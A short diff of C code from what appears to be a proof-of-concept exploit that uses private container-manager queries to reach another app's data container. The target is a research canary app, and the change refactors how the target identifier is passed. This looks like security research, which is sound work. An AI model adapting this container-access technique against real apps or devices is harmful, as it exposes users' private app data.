@@ -99,18 +99,16 @@ int run_mobilehousearrest_poc(void)
         return 3;
     }
     query_set_class(query, 2);                  // app-data container
+    xpc_object_t identifier = xpc_string_create(
+        "local.research.SandboxCanaryVictim");
+    query_set_ids(query, identifier);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(identifier);
+#endif
     query_set_flags(query, UINT64_C(0x900000000));
     if (query_set_part != NULL) {
         query_set_part(query, 0);
     }
-
-    xpc_object_t ids = xpc_array_create(NULL, 0);
-    xpc_array_set_string(ids, XPC_ARRAY_APPEND,
-                         "local.research.SandboxCanaryVictim");
-    query_set_ids(query, ids);
-#if !OS_OBJECT_USE_OBJC
-    xpc_release(ids);
-#endif
 
     container_object_t borrowed = query_result(query);
     container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
